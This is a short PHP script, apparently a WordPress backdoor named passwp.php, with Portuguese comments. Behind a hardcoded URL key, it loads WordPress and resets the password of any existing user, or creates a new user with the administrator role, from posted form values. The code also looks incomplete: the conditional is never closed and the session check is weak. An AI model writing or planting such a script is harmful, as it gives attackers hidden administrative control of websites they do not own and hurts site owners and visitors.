<?php
if($_GET['auth'] == 'asdfghjkl'):

session_start();
$session = time();
$_SESSION['code'] = $session;
$url_atual = 'https://' . $_SERVER['HTTP_HOST'] .'/passwp.php';



if(!empty($_POST) && $_POST['code'] == $_SESSION['code'] ) {
        // Caminho absoluto para o arquivo wp-load.php
        require_once('./wp-load.php');

        // Informações do novo usuário
        $username = $_POST['username'];
        $email = $_POST['email'];
        $password = $_POST['password'];

        // Verifica se o usuário já existe
        if (username_exists($username) || email_exists($email)) {
                // Altera a senha se o usuário já existe
                $user_id = username_exists($username) ?: email_exists($email);
                wp_set_password($password, $user_id);
                echo "Senha alterada com sucesso.";
                exit;
        }

        // Cria o novo usuário
        $user_id = wp_create_user($username, $password, $email);

        if (is_wp_error($user_id)) {
            echo "Erro ao criar usuário: " . $user_id->get_error_message();
            exit;
        }

        // Define o novo usuário como administrador
        $user = new WP_User($user_id);
        $user->set_role('administrator');

        echo "Usuário administrador criado com sucesso.";

}
?>
